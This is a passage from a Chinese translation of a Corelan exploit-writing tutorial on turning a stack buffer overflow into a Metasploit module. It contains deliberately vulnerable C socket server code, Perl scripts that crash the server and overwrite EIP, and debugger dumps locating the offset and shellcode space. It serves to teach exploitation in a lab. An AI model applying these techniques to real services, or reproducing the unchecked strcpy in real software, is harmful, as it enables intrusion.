M3u文件下的基于SEH的Exploit几乎和mpf版本是一样的，所以我不在这里讨论这个了。
如果你想就这个练习进行讨论，登陆/注册下面的论坛：
http://www.corelan.be:8800/index.php/forum/writing-exploits/
（我可能就会在几天后把解决办法贴到这个论坛上面了）
请继续关注更多信息：Exploit编写中的tips&tricks......
This entry was posted on Tuesday, July 28th, 2009 at 8:15 pm and is filed under Exploits, Security
You can follow any responses to this entry through the Comments (RSS) feed. You can leave
a response, or trackback from your own site.
Exploit 编写系列教程第四篇：编写Metasploit exploit
【作者】：Peter Van Eeckhoutte
【译者】：riusksk（泉哥：http://riusksk.blogbus.com）
在exploit编写系列教程第一篇中，笔者已经讲述了两种对于常见漏洞的利用方式：栈溢出（覆盖EIP）与利用SHE
链表进行栈溢出。在列出的例子中，笔者已经利用perl脚本去演示如何构造一个可行的exploit。
显然，编写exploit不应局制于perl语言上。笔者猜想：每种编程语言都可以用于编写exploit „„因此你可以挑
选自己最为熟悉的一种语言来编写 exploit（比如 python,c,c++,c#等等）。尽管也许自己编写出来的 exploit 勉强可
用，但如果可以将其列入自己的Metasploit Framework中可能会更好，因为这样就可以利用Metasploit的一些独特
功能。
Metasploit exploit 模块结构
一个典型的Metasploit exploit module由以下部分组成：
● header and some dependencies
— Some comments about the exploit module
— require „msf/core‟
● class definition
● includes
● “def” definitions :
— initialize
—check (optional)
— exploit
读者可以在 metasploit module 中使用#来添加注释，上面这些就是我们现在需要知道的，接下来我们看看建立
Metasploit exploit module所需要的每一步骤。
案例研究：编写针对漏洞服务器的exploit
下面我们将以下列存在漏洞的服务端代码（C）来演示exploit的编写：
#include 
#include 
#include 
//load windows socket
#pragma comment(lib, "wsock32.lib")
//Define Return Messages
#define SS_ERROR 1
#define SS_OK 0
void pr( char *str)
{
char buf[500]="";
strcpy(buf,str);
}
void sError(char *str)
{
MessageBox (NULL, str, "socket Error" ,MB_OK);
WSACleanup();
}
int main(int argc, char **argv)
{
WORD sockVersion;
WSADATA wsaData;
int rVal;
char Message[5000]="";
char buf[2000]="";
u_short LocalPort;
LocalPort = 200;
//wsock32 initialized for usage
sockVersion = MAKEWORD(1,1);
WSAStartup(sockVersion, &wsaData);
//create server socket
SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
if(serverSocket == INVALID_SOCKET)
{
sError("Failed socket()");
return SS_ERROR;
}
SOCKADDR_IN sin;
sin.sin_family = PF_INET;
sin.sin_port = htons(LocalPort);
sin.sin_addr.s_addr = INADDR_ANY;
//bind the socket
rVal = bind(serverSocket, (LPSOCKADDR)&sin, sizeof(sin));
if(rVal == SOCKET_ERROR)
{
sError("Failed bind()");
WSACleanup();
return SS_ERROR;
}
//get socket to listen
rVal = listen(serverSocket, 10);
if(rVal == SOCKET_ERROR)
{
sError("Failed listen()");
WSACleanup();
return SS_ERROR;
}
//wait for a client to connect
SOCKET clientSocket;
clientSocket = accept(serverSocket, NULL, NULL);
if(clientSocket == INVALID_SOCKET)
{
sError("Failed accept()");
WSACleanup();
return SS_ERROR;
}
int bytesRecv = SOCKET_ERROR;
while( bytesRecv == SOCKET_ERROR )
{
//receive the data that is being sent by the client max limit to 5000 bytes.
bytesRecv = recv( clientSocket, Message, 5000, 0 );
if ( bytesRecv == 0 || bytesRecv == WSAECONNRESET )
{
printf( "\nConnection Closed.\n");
break;
}
}
//Pass the data received to the function pr
pr(Message);
//close client socket
closesocket(clientSocket);
//close server socket
closesocket(serverSocket);
WSACleanup();
return SS_OK;
}
编译以上代码，然后在Windows 2003 server R2 SP2下运行（笔者用lcc-win32来编译代码）。当你发送1000字节
到服务端时，服务器将崩溃。下面的perl脚本可触发程序崩溃：
use strict;
use Socket;
my $junk = "\x41" x1000;
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk."\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
存在漏洞的服务端挂掉，同时EIP被A‟s覆盖掉：
0:001> g
(e00.de0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e05c ebx=7ffd6000 ecx=00000000 edx=0012e446 esi=0040bdec edi=0012ebe0
eip=41414141 esp=0012e258 ebp=41414141 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010212
41414141 ?? ???
利用Mestasploit pattern，我们可确定覆盖EIP的偏移量为504字节。下面我们将重新编写一份可触发程序崩溃的
脚本以证实这一偏移量，同时注意溢出后各寄存器的值：
use strict;
use Socket;
my $totalbuffer=1000;
my $junk = "\x41" x 504;
my $eipoverwrite = "\x42" x 4;
my $junk2 = "\x43" x ($totalbuffer-length($junk.$eipoverwrite));
# initialize host and port
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');
# get the port address
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);
print "[+] Setting up socket\n";
# create the socket, connect to the port
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk.$eipoverwrite.$junk2."\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
发送504 A‟s，4 B‟s以及一串C‟s后，可以看到以下寄存器及栈中的内容：
0:001> g
(ed0.eb0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012e05c ebx=7ffde000 ecx=00000000 edx=0012e446 esi=0040bdec edi=0012ebe0
eip=42424242 esp=0012e258 ebp=41414141 iopl=0 nv up ei pl nz ac po nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010212
42424242 ?? ???
0:000> d esp
0012e258 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e268 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e278 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e288 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e298 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e2a8 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e2b8 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
0012e2c8 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 CCCCCCCCCCCCCCCC
下面增加junk size，看看有多少可用空间能存放shellcode。这是相当重要的，因为你将需要在Metasploit module
中指定这一参数。更改$totalbuffer的值为2000，正如所预期的一样，溢出漏洞仍被触发了。ESP的内容表示我们
可以用C‟s填充内存到esp+5d3 (1491 bytes)。以上将是我们的shellcode空间（或多或少）。
我们需要用jmp esp（或call esp，或其它等同指令）覆盖EIP，再用shellcode去替换掉C‟s，这样exploit应该就
可以工作得很好了。利用findjmp，我们可以在Windows 2003 R2 SP2 server中搜索到可利用的地址：